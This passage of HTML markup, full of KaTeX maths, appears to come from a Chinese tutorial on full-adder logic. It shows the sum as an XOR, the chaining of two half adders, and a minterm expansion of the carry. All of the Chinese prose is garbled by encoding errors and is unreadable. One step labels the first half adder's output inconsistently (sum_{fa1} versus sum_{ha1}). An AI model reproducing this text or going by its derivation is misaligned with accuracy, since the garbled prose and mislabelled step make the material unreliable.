<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{ha}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> è¡¨ç¤º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span></span></span></span></span> çš„å’Œï¼ˆå¿½ç•¥è¿›ä½ï¼‰ï¼Œæ‰€ä»¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub><mo>=</mo><mi>a</mi><mo>âŠ•</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">sum_{ha}=a\oplus b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span>ã€‚</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">sum_{ha}=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span> æ—¶ï¼Œåªæœ‰ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">c=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">sum_{fa}=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span> æ‰ä¼šæˆç«‹</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">sum_{ha}=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span> æ—¶ï¼Œåªæœ‰ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">c=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span>ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">sum_{fa}=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span> æ‰ä¼šæˆç«‹</li>
</ul>
<p>æ‰€ä»¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub><mo>=</mo><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub><mo>âŠ•</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">sum_{fa}=sum_{ha}\oplus c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span></p>
<p>è€Œ <code>HalfAdder</code> çš„ä½œç”¨å°±æ˜¯å¯¹è¾“å…¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span></span></span></span></span> åˆ†åˆ«æ‰§è¡Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âŠ•</mo></mrow><annotation encoding="application/x-tex">\oplus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord">âŠ•</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ§</mo></mrow><annotation encoding="application/x-tex">\land</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord">âˆ§</span></span></span></span></span> è¿ç®—ï¼Œæ‰€ä»¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{fa}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> å¯ä»¥é€šè¿‡æ‹¼æ¥ä¸¤ä¸ª <code>HalfAdder</code> æ¥å®ç° â¬‡ï¸</p>
<ul>
<li>ç¬¬ä¸€ä¸ª <code>HalfAdder</code> ä»¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span></span></span></span></span> ä¸ºè¾“å…¥ï¼Œå…¶ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi><mn>1</mn></mrow></msub><mo>=</mo><mi>a</mi><mo>âŠ•</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">sum_{ha1}=a\oplus b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></li>
<li>ç¬¬äºŒä¸ª <code>HalfAdder</code> ä»¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{fa1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span> ä¸ºè¾“å…¥ï¼Œå…¶ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi><mn>2</mn></mrow></msub><mo>=</mo><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi><mn>1</mn></mrow></msub><mo>âŠ•</mo><mi>c</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">sum_{ha2}=sum_{fa1}\oplus c=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8694em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span></span></span></span></span></li>
</ul>
<h4 data-id="heading-5">å¦‚ä½•è¡¨ç¤º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">carry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span></span></span></span></span></h4>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">carry_{fa}=(\neg{a}\land b\land c)\lor(a\land \neg{b}\land c)\lor(a\land b\land \neg{c})\lor(a\land b\land c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">c</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">=(\neg{a}\land b\land c)\lor(a\land \neg{b}\land c)\lor((a\land b\land \neg{c})\lor(a\land b\land c))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">((</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">c</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" 